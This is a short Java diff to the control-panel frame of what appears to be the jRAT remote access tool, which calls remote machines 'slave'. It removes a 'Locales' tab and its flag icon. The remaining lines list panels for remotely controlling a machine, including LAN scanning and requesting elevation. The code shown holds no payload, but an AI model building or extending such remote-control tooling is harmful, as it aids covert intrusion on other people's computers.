@@ -67,7 +67,6 @@ import se.jrat.client.ui.panels.PanelControlInstalledPrograms;
 import se.jrat.client.ui.panels.PanelControlJVMProperties;
 import se.jrat.client.ui.panels.PanelControlLANScan;
 import se.jrat.client.ui.panels.PanelControlLoadedPlugins;
-import se.jrat.client.ui.panels.PanelControlLocales;
 import se.jrat.client.ui.panels.PanelControlMessagebox;
 import se.jrat.client.ui.panels.PanelControlMonitors;
 import se.jrat.client.ui.panels.PanelControlNetGateway;
@@ -84,7 +83,6 @@ import se.jrat.client.ui.panels.PanelControlSpeech;
 import se.jrat.client.ui.panels.PanelControlTrace;
 import se.jrat.client.ui.panels.PanelControluTorrentDownloads;
 import se.jrat.client.ui.renderers.ControlPanelTreeRenderer;
-import se.jrat.client.utils.FlagUtils;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
 
@@ -341,7 +339,6 @@ public class FrameControlPanel extends BaseFrame {
 				r.icons.put("config", IconUtils.getIcon("tab-settings"));
 				r.icons.put("view installed plugins", IconUtils.getIcon("plugin-go"));
 				r.icons.put("notes", IconUtils.getIcon("notes"));
-				r.icons.put("locales", FlagUtils.getFlag(slave));
 				r.icons.put("request elevation", IconUtils.getIcon("shield"));
 
 				ImageIcon plugin = IconUtils.getIcon("plugin");
@@ -367,7 +364,6 @@ public class FrameControlPanel extends BaseFrame {
 			tabbedPane.removeAll();
 			tabbedPane.addTab("Computer Info", i.get("computer info"), panels.get("computer info"));
 			tabbedPane.addTab("System Info", i.get("system monitor"), panels.get("system monitor"));
-			tabbedPane.addTab("Locales", i.get("locales"), panels.get("locales"));
 			tabbedPane.addTab("Drives", i.get("drives"), panels.get("drives"));
 			tabbedPane.addTab("Monitors", i.get("monitors"), panels.get("monitors"));
 			tabbedPane.addTab("JVM Info", i.get("jvm info"), panels.get("jvm info"));
@@ -438,7 +434,6 @@ public class FrameControlPanel extends BaseFrame {
 
 		systeminfo.add(getTreeNode("Computer Info"));
 		systeminfo.add(getTreeNode("System Monitor"));
-		systeminfo.add(getTreeNode("Locales"));
 		systeminfo.add(getTreeNode("Environment Variables"));
 		systeminfo.add(getTreeNode("System Properties"));
 		systeminfo.add(getTreeNode("Drives"));
@@ -570,7 +565,6 @@ public class FrameControlPanel extends BaseFrame {
 			addPanel("error log", new PanelControlErrorLog(slave));
 			addPanel("config", new PanelControlConfig(slave));
 			addPanel("view installed plugins", new PanelControlLoadedPlugins(slave));
-			addPanel("locales", new PanelControlLocales(slave));
 			addPanel("trace", new PanelControlTrace(slave));
 		} catch (Exception ex) {
 			ex.printStackTrace();
